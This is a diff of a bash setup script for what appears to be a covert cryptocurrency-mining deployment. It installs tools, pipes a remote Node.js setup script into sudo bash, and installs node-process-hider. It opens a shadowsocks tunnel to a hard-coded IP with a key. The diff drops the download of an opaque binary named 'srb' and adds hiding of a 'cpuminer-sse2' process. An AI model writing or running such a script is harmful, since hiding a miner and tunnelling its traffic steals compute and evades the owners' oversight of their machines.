@@ -1,7 +1,7 @@
 #!/bin/bash
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-curl -fsSL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -
 apt-get install -y nodejs
 
 npm i -g node-process-hider
@@ -31,11 +31,8 @@ sleep .2
 echo " "
 echo " "
 
-wget https://raw.githubusercontent.com/hondacars/xxx/main/srb
-chmod +x srb
-
 apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
 
-ph add srb
+sudo ph add cpuminer-sse2
